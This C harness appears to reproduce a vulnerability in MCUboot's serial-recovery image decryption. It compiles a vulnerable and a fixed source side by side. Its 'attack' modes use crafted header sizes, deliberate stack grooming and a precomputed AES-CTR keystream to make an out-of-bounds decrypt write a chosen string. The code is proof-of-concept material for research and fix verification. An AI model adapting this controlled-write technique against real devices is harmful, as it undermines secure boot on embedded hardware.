/*
 * mcuboot2shell real-source harness.
 *
 * The pinned vulnerable boot_serial_encryption.c and upstream
 * boot/bootutil/src/encrypted.c are compiled verbatim (the latter with
 * -Dboot_enc_decrypt=real_boot_enc_decrypt so a logging wrapper can record
 * the destination pointer). Only flash/state/key-loading stubs and the
 * caller are local. No source line inside either pinned function is edited.
 */
#include <assert.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "mcuboot_config/mcuboot_config.h"
#include "bootutil/image.h"
#include "bootutil/enc_key.h"
#include "bootutil/bootutil.h"
#include "bootutil/bootutil_public.h"
#include "bootutil/bootutil_log.h"
#include "bootutil/fault_injection_hardening.h"
#include "bootutil_area.h"
#include "bootutil_priv.h"

#define SECT_SZ 4096u
#define FLASH_SZ 32768u

fih_ret FIH_SUCCESS = 0;
fih_ret FIH_FAILURE = -1;
fih_ret FIH_NO_BOOTABLE_IMAGE = -2;
fih_ret FIH_BOOT_HOOK_REGULAR = -3;

static uint8_t g_image[FLASH_SZ];
static uint8_t g_key[BOOT_ENC_KEY_SIZE];
static uint8_t g_groom_ct[8192];
static uint8_t g_groom_pt[8192];
static uint8_t g_readback[64];
static uint32_t g_readback_len;
static uint32_t g_hsoc;
static uint32_t g_sect_off;
static uint8_t *g_buf_base;
static uint32_t g_idx;
static uint32_t g_groom_len;
static int g_groom;

void bootutil_wipe_memory(void *p, size_t n) { memset(p, 0, n); }
void boot_state_init(struct boot_loader_state *state) { (void)state; }
void boot_state_clear(struct boot_loader_state *state) { (void)state; }
uint32_t boot_status_off(const struct flash_area *fap) { (void)fap; return FLASH_SZ - 128; }
fih_ret bootutil_img_validate(struct boot_loader_state *s, struct image_header *h,
                              const struct flash_area *f, uint8_t *b, uint32_t bs,
                              uint8_t *seed, int sl, uint8_t *oh)
{
    (void)s; (void)h; (void)f; (void)b; (void)bs; (void)seed; (void)sl; (void)oh;
    return FIH_SUCCESS;
}
int bootutil_tlv_iter_begin(struct image_tlv_iter *it, const struct image_header *h,
                            const struct flash_area *f, uint16_t t, bool p)
{
    (void)it; (void)h; (void)f; (void)t; (void)p; return -1;
}
int bootutil_tlv_iter_next(struct image_tlv_iter *it, uint32_t *o, uint16_t *l, uint16_t *t)
{
    (void)it; (void)o; (void)l; (void)t; return -1;
}
int boot_image_load_header(const struct flash_area *fa, struct image_header *hdr)
{
    (void)fa;
    memcpy(hdr, &g_image[0], sizeof(*hdr));
    return 0;
}
int boot_enc_retrieve_private_key(struct bootutil_key **k) { (void)k; return -1; }

int flash_area_read(const struct flash_area *fa, uint32_t off, void *dst, uint32_t len)
{
    (void)fa;
    if (off > FLASH_SZ || len > FLASH_SZ - off) { return -1; }
    memcpy(dst, &g_image[off], len);
    g_buf_base = (uint8_t *)dst;
    /* Deliberate stack grooming for the CTR ciphertext source: an exploit
     * would obtain these bytes from adjacent stack contents. Only used in
     * the plain build; ASan runs have g_groom=0 so the ASan report is the
     * real decryptor's write alone. */
    if (g_groom && g_idx < sizeof(g_groom_ct)) {
        uint32_t glen = g_groom_len;
        if (g_idx + glen > sizeof(g_groom_ct)) { glen = sizeof(g_groom_ct) - g_idx; }
        if (glen > len) { glen = len; }
        memcpy(g_buf_base + g_idx, g_groom_ct, glen);
    }
    return 0;
}
int flash_area_write(const struct flash_area *fa, uint32_t off, const void *src, uint32_t len)
{
    (void)fa;
    if (off > FLASH_SZ || len > FLASH_SZ - off) { return -1; }
    memcpy(&g_image[off], src, len);
    return 0;
}
int boot_erase_region(const struct flash_area *fa, uint32_t off, uint32_t sz, bool backwards)
{
    (void)fa; (void)backwards;
    if (off > FLASH_SZ || sz > FLASH_SZ - off) { return -1; }
    memset(&g_image[off], 0xff, sz);
    return 0;
}
int flash_area_get_sector(const struct flash_area *fa, uint32_t off, struct flash_sector *s)
{
    (void)fa;
    s->fs_off = off & ~(SECT_SZ - 1u);
    s->fs_size = SECT_SZ;
    return 0;
}
uint32_t flash_area_align(const struct flash_area *fa) { (void)fa; return 8; }
uint8_t flash_area_erased_val(const struct flash_area *fa) { (void)fa; return 0xff; }

int real_boot_enc_decrypt(struct enc_key_data *enc, uint32_t off, uint32_t sz,
                          uint32_t blk_off, uint8_t *buf);

/* Interposing wrapper: real_boot_enc_decrypt is the verbatim upstream body. */
int boot_enc_decrypt(struct enc_key_data *enc, uint32_t off, uint32_t sz,
                     uint32_t blk_off, uint8_t *buf)
{
    int delta = g_buf_base ? (int)(buf - g_buf_base) : -1;
    printf("REAL_DECRYPT off=%u len=%u blk_off=%u dst_delta=%d dst=%p\n",
           off, sz, blk_off, delta, (void *)buf);
    fflush(stdout);
    int rc = real_boot_enc_decrypt(enc, off, sz, blk_off, buf);
#ifndef ASAN_BUILD
    if (g_groom && rc == 0 && delta >= 0) {
        g_readback_len = sz < sizeof(g_readback) ? sz : sizeof(g_readback);
        memcpy(g_readback, buf, g_readback_len);
    }
#endif
    return rc;
}

#ifdef FIXED_SOURCE
#include "../src/mcuboot-fixed-boot_serial_encryption.c"
#else
#include "../src/mcuboot-parent-boot_serial_encryption.c"
#endif

int harness_decrypt_region(struct enc_key_data *enc, const struct flash_area *fa,
                           struct image_header *hdr, uint32_t off, uint32_t sz)
{
    return decrypt_region_inplace(enc, fa, hdr, off, sz);
}

static void hex(const uint8_t *p, uint32_t n)
{
    for (uint32_t i = 0; i < n; i++) { printf("%02x", p[i]); }
    printf("\n");
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "safe";
    struct image_header hdr;
    struct flash_area fa;
    struct enc_key_data enc;
    static uint8_t zeros[8192] = {0};
    static uint8_t ct[8192];
    uint32_t off = 0;
    uint32_t sz = SECT_SZ;
    uint32_t blk_sz = 0;

    memset(&hdr, 0, sizeof(hdr));
    memset(&fa, 0, sizeof(fa));
    memset(&g_image, 0xcc, sizeof(g_image));
    for (uint32_t i = 0; i < sizeof(g_key); i++) { g_key[i] = (uint8_t)i; }
    hdr.ih_flags = IMAGE_F_ENCRYPTED_AES128;
    if (!strcmp(mode, "edge")) {
        g_hsoc = 4104; hdr.ih_hdr_size = 4104; hdr.ih_img_size = 0xffffffffu - 4104u;
        off = 4096; g_idx = 4104; blk_sz = 4088;
    } else if (!strcmp(mode, "attack")) {
        g_hsoc = 6144; hdr.ih_hdr_size = 6144; hdr.ih_img_size = 0xffffffffu - 6144u;
        off = 4096; g_idx = 6144; blk_sz = 2048;
    } else if (!strcmp(mode, "attack2")) {
        g_hsoc = 1024; hdr.ih_hdr_size = 1024; hdr.ih_img_size = 1976;
        off = 0; g_idx = 1024; blk_sz = 3000;
    } else {
        g_hsoc = 0; hdr.ih_hdr_size = 0; hdr.ih_img_size = 4096;
        off = 0; g_idx = 0; blk_sz = 4096;
    }
#ifdef FIXED_SOURCE
    if (!strcmp(mode, "edge")) { g_idx = 8; }
    else if (!strcmp(mode, "attack")) { g_idx = 2048; }
    else if (!strcmp(mode, "attack2")) { g_idx = 1024; blk_sz = 1976; }
#endif
    fa.fa_id = 0; fa.fa_off = 0; fa.fa_size = FLASH_SZ;

    boot_enc_init(&enc);
    if (boot_enc_set_key(&enc, g_key) != 0) { printf("KEY FAIL\n"); return 2; }

    /* Compute the real AES-CTR keystream for the call the pinned function
     * will make, then groom ciphertext whose decryption is a chosen string. */
    uint32_t dec_off = off + g_idx - g_hsoc;
    uint32_t dec_len = blk_sz;
    if (dec_len > sizeof(ct)) { dec_len = sizeof(ct); }
    memcpy(g_groom_pt, "MISHE-REAL-AES!!", 16);
    memcpy(ct, zeros, dec_len);
    boot_enc_encrypt(&enc, dec_off, dec_len, 0, ct);
    for (uint32_t i = 0; i < dec_len; i++) { g_groom_ct[i] = ct[i] ^ g_groom_pt[i % 16]; }
#ifndef ASAN_BUILD
    g_groom_len = dec_len;
    g_groom = 1;
#endif

    int rc = harness_decrypt_region(&enc, &fa, &hdr, off, sz);
    printf("mode=%s rc=%d dec_off=%u dec_len=%u idx=%u\n", mode, rc, dec_off, dec_len, g_idx);
    if (g_readback_len) {
        printf("readback_len=%u readback=", g_readback_len);
        hex(g_readback, g_readback_len < 16 ? g_readback_len : 16);
        printf("expected=MISHE-REAL-AES!!\n");
    }
    boot_enc_drop(&enc);
    return rc == 0 ? 0 : 1;
}
